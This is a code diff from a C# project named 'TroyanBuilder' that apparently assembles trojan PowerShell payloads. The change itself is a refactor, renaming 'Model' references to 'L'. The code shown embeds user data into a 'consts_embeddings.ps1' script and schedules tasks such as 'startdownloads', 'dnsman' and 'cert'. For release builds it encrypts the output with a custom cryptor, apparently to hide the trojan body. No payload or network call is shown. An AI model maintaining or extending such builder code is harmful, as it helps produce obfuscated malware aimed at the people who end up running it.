@@ -1,8 +1,8 @@
-﻿namespace TroyanBuilder;
+namespace TroyanBuilder;
 
 public abstract class BodyBuilder: CustomBuilder
 {
-    protected override string SourceDir => Model.TroyanScriptDir;
+    protected override string SourceDir => L.TroyanScriptDir;
 
     protected override string[] PriorityTasks => new [] {"startdownloads", "dnsman", "cert" };
     protected override string[] UnpriorityTasks => new [] {"extraupdate" };
@@ -86,13 +86,13 @@ public abstract class BodyBuilder: CustomBuilder
         template = template.Replace("_EMBED_X", embedData, StringComparison.InvariantCulture);
         template = template.Replace("_EMBED_NAME", embedName);
 
-        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_embeddings.ps1");
+        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_embeddings.ps1");
         File.WriteAllText(outputPath, template);
     }
 
     private (string fileNames, string encodedData) ReadEmbeddings(string name)
     {
-        var srcFolder = Path.Combine(Model.UserDataDir, name);
+        var srcFolder = Path.Combine(L.UserDataDir, name);
 
         if (!Directory.Exists(srcFolder))
         {
@@ -146,15 +146,15 @@ public abstract class BodyBuilder: CustomBuilder
 
 public class BodyBuilderDebug : BodyBuilder
 {
-    protected override string OutputFile => Model.BodyDebug;
+    protected override string OutputFile => L.BodyDebug;
 }
 
 public class BodyBuilderRelease : BodyBuilder
 {
-    protected override string OutputFile => Model.BodyRelease;
+    protected override string OutputFile => L.BodyRelease;
 
     protected override void PostBuild()
     {
-        CustomCryptor.Encode(File.ReadAllText(OutputFile), Model.Body);
+        CustomCryptor.Encode(File.ReadAllText(OutputFile), L.Body);
     }
 }
